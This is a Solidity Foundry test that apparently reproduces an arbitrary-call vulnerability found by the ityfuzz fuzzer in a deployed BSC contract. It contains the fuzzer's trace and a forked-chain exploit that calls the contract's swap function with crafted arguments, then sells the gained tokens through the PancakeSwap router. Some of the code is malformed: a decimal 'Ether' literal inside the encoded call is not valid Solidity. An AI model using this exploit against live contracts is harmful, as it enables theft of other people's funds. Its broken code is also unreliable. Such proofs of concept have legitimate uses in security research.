// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -o -t 0x6D8981847Eb3cc2234179d0F0e72F6b6b2421a01,0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56,0xDb821BB482cfDae5D3B1A48EeaD8d2F74678D593,0x3a6d8cA21D1CF76F653A67577FA0D27453350dD8,0x0ccee62efec983f3ec4bad3247153009fb483551,0x3B78458981eB7260d1f781cb8be2CaAC7027DbE2 -c bsc --onchain-block-number 26024419 -f -i -p --onchain-etherscan-api-key $BSC_ETHERSCAN_API_KEY
/*

😊😊 Found violations!


================ Oracle ================
Arbitrary call from "0x0ccee62efec983f3ec4bad3247153009fb483551" to 0x6d8981847eb3cc2234179d0f0e72f6b6b2421a01
================ Trace ================
[38;2;220;144;36m[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024[0m
   ├─[1] [38;2;72;53;81m0x0Ccee62EfEC983f3EC4bAD3247153009FB483551[0m.[38;2;255;123;114mswap[0m{value: [38;2;153;0;204m1204203.4531 Ether[0m}([38;2;0;118;255m0x0000000000000000000000000000000000000000[0m, [38;2;8;125;86m0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56[0m, [38;2;218;222;254m0xeB2A223539b8Ba74600aaE7D5a649fD5f9dADEfe[0m, 0, 89909151622158969629228128856546253134320921465851481455772.9453 Ether, [38;2;211;29;219m0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb[0m, 0x40d80000c0ff64ff284040644040404040bf4040)
   ├─[1] [38;2;0;118;255mRouter[0m.[38;2;255;123;114mswapExactTokensForETH[0m(100% Balance, 0, path:([38;2;72;53;81m0x0Ccee62EfEC983f3EC4bAD3247153009FB483551[0m → WETH), address(this), block.timestamp);
   │  │  └─ ← ()
   │  │  └─ ← ()
   │  │  └─ ← ()


 */

contract C6D89 is Test {
    function setUp() public {
        vm.createSelectFork("bsc", 26024419);
    }

    function test() public {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        address weth = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, 1204203453131759529495301);
        0x0Ccee62EfEC983f3EC4bAD3247153009FB483551.call{value: 1204203453131759529495301}(abi.encodeWithSignature(
            "swap(address,address,address,uint256,uint256,address,bytes)",0x0000000000000000000000000000000000000000, 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56, 0xeB2A223539b8Ba74600aaE7D5a649fD5f9dADEfe, 0, 89909151622158969629228128856546253134320921465851481455772.9453 Ether, 0x35c9dfd76bf02107ff4f7128Bd69716612d31dDb, 0x40d80000c0ff64ff284040644040404040bf4040
        )); 
        vm.startPrank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        uint256 amount0 = IERC20(0x0Ccee62EfEC983f3EC4bAD3247153009FB483551).balanceOf(address(this));
        IERC20(0x0Ccee62EfEC983f3EC4bAD3247153009FB483551).approve(router, amount0);
        address[] memory liq_path0 = new address[](2);
        liq_path0[0] = 0x0Ccee62EfEC983f3EC4bAD3247153009FB483551;
        liq_path0[1] = address(weth);
        vm.deal(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024, amount0);
        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount0, 0, liq_path0, address(this), block.timestamp
        );
        vm.stopPrank();
    }

    // Stepping with return
    receive() external payable {}
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function skim(address to) external;
    function sync() external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}
